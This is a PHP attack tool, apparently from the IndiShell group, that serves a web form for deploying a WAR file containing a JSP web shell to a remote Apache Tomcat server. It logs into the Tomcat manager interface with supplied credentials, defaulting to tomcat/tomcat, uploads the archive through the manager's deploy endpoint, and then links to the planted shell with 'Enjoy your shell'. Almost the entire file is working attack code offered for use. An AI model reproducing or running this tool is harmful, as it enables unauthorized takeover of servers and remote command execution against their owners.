<?php 
$head = '

<html>

<head>

<link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLfLXmLeMSTt0jOXREfgvdp8IYWnE9_t49PpAiJNvwHTqnKkL4" rel="icon" type="image/x-icon"/>

</script>

<title>--==[[Mannu Sh3LL]]==--</title>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


<STYLE>

body {
background: url("https://raw.githubusercontent.com/incredibleindishell/sqlite-lab/master/images/head.jpg");
	background-size: 100% 700px;

font-family: Tahoma;

color: white;



}


input {

border			: solid 2px ;

border-color		: black;

BACKGROUND-COLOR: #444444;

font: 8pt Verdana;


color: white;

}


submit {

BORDER:  buttonhighlight 2px outset;

BACKGROUND-COLOR: Black;

width: 30%;

color: #FFF;

}


#t input[type=\'submit\']{

	COLOR: White;

	border:none;

	BACKGROUND-COLOR: black;

}


#t input[type=\'submit\']:hover {

	

	BACKGROUND-COLOR: #ff9933;

	color: black;

	

}

tr {

BORDER: dashed 1px #333;

color: #FFF;

}

td {

BORDER: dashed 0px ;

}

.table1 {

BORDER: 0px Black;

BACKGROUND-COLOR: Black;

color: #FFF;

}

.td1 {

BORDER: 0px;

BORDER-COLOR: #333333;

font: 7pt Verdana;

color: Green;

}

.tr1 {

BORDER: 0px;

BORDER-COLOR: #333333;

color: #FFF;

}

table {

BORDER: dashed 2px #333;

BORDER-COLOR: #333333;

BACKGROUND-COLOR: #191919;;

color: #FFF;

}

textarea {

border			: dashed 2px #333;

BACKGROUND-COLOR: Black;

font: Fixedsys bold;

color: #999;

}

A:link {

border: 1px;

	COLOR: red; TEXT-DECORATION: none

}

A:visited {

	COLOR: red; TEXT-DECORATION: none

}

A:hover {

	color: White; TEXT-DECORATION: none

}

A:active {

	color: white; TEXT-DECORATION: none

}

</STYLE>

<script type="text/javascript">

<!--

    function lhook(id) {

       var e = document.getElementById(id);

       if(e.style.display == \'block\')

          e.style.display = \'none\';

       else

          e.style.display = \'block\';

    }

//-->

</script>

'; 




		echo $head ;

		echo '


<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >


			


       <td width="100%" align=center valign="top" rowspan="1">

           <font color=#ff9933 size=5 face="comic sans ms"><b>--==[[ Apache </font><font color=white size=5 face="comic sans ms"><b>Tomcat shell </font><font color=green size=5 face="comic sans ms"><b> uploader]]==--</font><br>
			<font color=#ff9933 size=3 face="comic sans ms"><b>--==[[ With </font><font color=white size=3 face="comic sans ms"><b>Love From IndiShell</font><font color=green size=3 face="comic sans ms"><b> Crew]]==--</font>
		   <div class="hedr"> 


        <td height="10" align="left" class="td1"></td></tr><tr><td 

        width="100%" align="center" valign="top" rowspan="1"><font 

        color="red" face="comic sans ms"size="1"><b> 

        <font color=#ff9933> 

        ##########################################</font><font color=white>#############################################</font><font color=green>#############################################</font><br><font color=white>

        -==[[Greetz to]]==--</font><br> <font color=#ff9933>zero cool ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba ,Silent poison India,Magnum sniper,ethicalnoob Indishell, cyber warrior, Hacker Fantastic and rest of TEAM INDISHELL<br>

<font color=white>--==[[Love to]]==--</font><br># My Father, my Ex Teacher, cold fire hacker, Mannu, ViKi, Jagriti, Hardeep Singh, Ashu bhai ji,Rafay Baloch,Soldier Of God,Shafoon,Rehan Manzoor,almas malik, Bhuppi,Mohit, Ffe ^_^,Govind Singh,Shardhanand ,Budhaoo,Don(Deepika kaushik) and D3 <br>



        <b> 

        <font color=#ff9933> 

        ##########################################</font><font color=white>#############################################</font><font color=green>#############################################</font>

						

           </table>

       </table> <br>


'; 

?>
<div align=center>
<table width="60%" cellspacing="0" cellpadding="0" class="tb1" style="border: 0px; background-color: transparent; ">
		   <tr><td width="80%" align=center style="padding: 10px; background-color: #191919; opacity: 0.6;">
		   
<form method="POST" enctype="multipart/form-data">
Apache Tomcat Target URL:	 <input style="width: 200px;" type=text name=url value="http://target:8080/">
<br><br>    
Tomcat interface Username: <input type=text name=uname value=tomcat>
Tomcat interface Password:	<input type=text name=password value=tomcat><br><br>
WAR file having JSP shell in it: -	<input type="file"  name="file" /> WAR file deploy name: -	<input type=text  name=deploy value="b0x" />
 

</td></tr><tr>
		  <td width="40%" align=center style="padding: 10px;">
		   <input type="submit" value="Billu, Own the box" name="own_it"/></form>
			</td></tr></table>


<?php 

function basic_auth($uname,$pass,$target)
{
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$target);
curl_setopt($ch, CURLOPT_TIMEOUT, 30); //timeout after 30 seconds
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
curl_setopt($ch, CURLOPT_USERPWD, $uname.':'.$pass);
$result=curl_exec ($ch);
return $status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);   //get status code
curl_close ($ch);
}

if(isset($_POST['own_it']))
{
	$username=$_POST['uname'];
	$password=$_POST['password'];
	$url_auth=trim($_POST['url']).'/manager/text/';

$result=basic_auth($username,$password,$url_auth);	
if($result=='200')
{
echo 'logged in successfully<br>';

}


	$url=trim($_POST['url']).'/manager/text/deploy?path=/'.trim($_POST['deploy']);

	$localFile = $_FILES['file']['tmp_name'];
	$fdata = fopen($localFile, 'r');

	$curl = curl_init();

	$cfile = new CURLFILE($_FILES['file']['tmp_name'], $_FILES['file']['type'], $_FILES['file']['name']);
	curl_setopt_array($curl, 
							array(
									CURLOPT_PUT => 1,
									CURLOPT_UPLOAD => 1,
									CURLOPT_INFILE => $fdata,
									CURLOPT_USERPWD => $username.':'.$password,
									CURLOPT_HTTPAUTH => CURLAUTH_BASIC,
									CURLOPT_NOPROGRESS => false, 
									CURLOPT_BUFFERSIZE => 128,
									CURLOPT_INFILESIZE => filesize($localFile),
									CURLOPT_URL => $url,
									CURLOPT_RETURNTRANSFER => true,
									CURLOPT_ENCODING => "",
									CURLOPT_MAXREDIRS => 10,
									CURLOPT_TIMEOUT => 30,
									CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
									CURLOPT_HTTPHEADER => array("content-type: multipart/form-data"),
								)
								);
	$response = curl_exec($curl);
	$err = curl_error($curl);

	curl_close($curl);

	if ($err){
				echo "Error #:" . $err;
			} 
	else {
			echo $response;
			echo '<br> Enjoy your shell at <br><a href="'.trim($_POST['url']).'/'.trim($_POST['deploy']).'/r.jsp">'.trim($_POST['url']).'/'.trim($_POST['deploy']).'/r.jsp</a>';
		}

}

echo "<font size=5 face=\"comic sans ms\" style=\"left: 0;bottom: 0; position: absolute;margin: 0px 0px 5px;\">Developed By 1046 at <font color=#ff9933>IndiShell Lab</font>";

?>